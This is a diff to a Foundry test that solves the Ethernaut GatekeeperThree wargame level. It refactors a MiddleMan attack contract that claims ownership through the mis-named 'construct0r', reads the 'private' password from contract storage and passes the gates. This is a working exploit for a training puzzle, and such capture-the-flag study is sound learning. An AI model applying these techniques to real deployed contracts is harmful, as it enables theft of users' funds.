@@ -5,18 +5,12 @@ import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/GatekeeperThree.sol";
 
 contract MiddleMan {
-    constructor() payable {}
-
-    function attack(address prey, uint256 password) public {
+    function attack(address prey, uint256 password) public payable {
         GatekeeperThree instance = GatekeeperThree(payable(prey));
-        address(instance).call{value: 0.0011 ether}("");
+        address(instance).call{value: msg.value}("");
         instance.construct0r();
         instance.getAllowance(password);
         instance.enter();
-    }
-
-    receive() external payable {
-        revert();
     }
 }
 
@@ -35,14 +29,17 @@ contract GatekeeperThreeTest is Test {
         assertEq(instance.entrant(), address(0));
 
         instance.createTrick();
-        SimpleTrick trick = SimpleTrick(instance.trick());
-        // SimpleTrick trick = SimpleTrick(vm.envAddress("GATEKEEPER_THREE_TRICK"));
+        SimpleTrick simpleTrick = SimpleTrick(instance.trick());
+        // SimpleTrick simpleTrick = SimpleTrick(vm.envAddress("GATEKEEPER_THREE_TRICK"));
 
-        uint256 password = uint256(vm.load(address(trick), bytes32(uint256(2))));
+        uint256 password = uint256(
+            vm.load(address(simpleTrick), bytes32(uint256(2)))
+        );
+        assertEq(simpleTrick.checkPassword(password), true);
         console.logUint(password);
 
-        MiddleMan middleMan = new MiddleMan{value: 0.0011 ether}();
-        middleMan.attack(address(instance), password);
+        MiddleMan middleMan = new MiddleMan();
+        middleMan.attack{value: 0.0011 ether}(address(instance), password);
 
         assertEq(instance.entrant(), msg.sender);
     }
